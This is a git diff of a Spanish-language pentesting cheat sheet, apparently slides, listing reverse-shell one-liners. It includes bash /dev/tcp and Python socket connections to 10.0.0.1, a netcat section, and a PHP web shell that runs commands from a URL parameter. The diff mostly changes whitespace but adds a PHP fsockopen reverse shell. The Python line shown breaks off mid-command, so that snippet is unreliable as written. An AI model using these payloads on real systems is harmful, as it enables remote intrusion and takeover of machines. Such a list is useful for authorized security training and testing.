@@ -17,8 +17,11 @@ tags:
 author: Felipe Canales Cayuqueo
 paginate: true
 ---
+
 # Ejemplos principales:
+
 ### Bash
+
 ```bash
 ┌─[root@kali]─[/home/user/demo/exploit]
 └──╼ bash -i >& /dev/tcp/10.0.0.1/443 0>&1
@@ -29,13 +32,15 @@ paginate: true
 └──╼ /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/443 0<&1'
 ```
 
-
 ### Python
+
 ```bash
 ┌─[root@kali]─[/home/user/demo/exploit]
 └──╼ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))
 ```
+
 ### Netcat
+
 ```bash
 #Versiones actualizadas
 ┌─[root@kali]─[/home/user/demo/exploit]
@@ -58,6 +63,14 @@ Para testear ejecución remota de comandos:
 
 ## <?php system($_GET[‘cmd’]);?>
 ```
+
+Para obtener una reverse shell por medio de comandos:
+
+```bash
+┌─[root@kali]─[/home/user/demo/exploit]
+└──╼ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
 
 Otros códigos se pueden encontrar en el directorio ```/usr/share/webshells/laudanum``` o desde el GitHub de [laudanum](https://github.com/adamcaudill/laudanum).
 
